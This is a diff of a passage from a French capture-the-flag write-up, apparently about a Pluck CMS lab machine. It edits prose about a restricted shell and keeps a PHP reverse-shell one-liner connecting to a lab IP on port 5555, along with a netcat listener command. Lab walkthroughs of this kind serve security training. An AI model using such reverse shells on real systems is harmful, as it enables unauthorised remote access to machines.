@@ -275,19 +275,13 @@ mysql:x:115:121:MySQL Server,,,:/nonexistent:/bin/false
 junior:x:1000:1000::/home/junior:/bin/bash
 _laurel:x:997:997::/var/log/laurel:/bin/false
 ```
-Notre shell est donc `/usr/sbin/nologin`.
-
-On essaye de changer notre shell, mais sans succès (on reste toujours pris avec `sh`)
-```bash
-/bin/bash
-ps -p $$ -o comm=
-sh
-```
+Notre shell est donc `/usr/sbin/nologin`. Cela signifie que nous serons trop limité dans nos actions. Il faut donc essayer de changer notre shell. 
 
 Puisque pluck est un CMS codé en php, on tente de créer un deuxième reverse shell avec php pour échapper le premier:
 ```php
 php -r '$sock=fsockopen("10.10.14.174",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
+
 Il ne faut pas oublier de démarrer netcat sur notre machine:
 ```bash
 nc -lvnp 5555
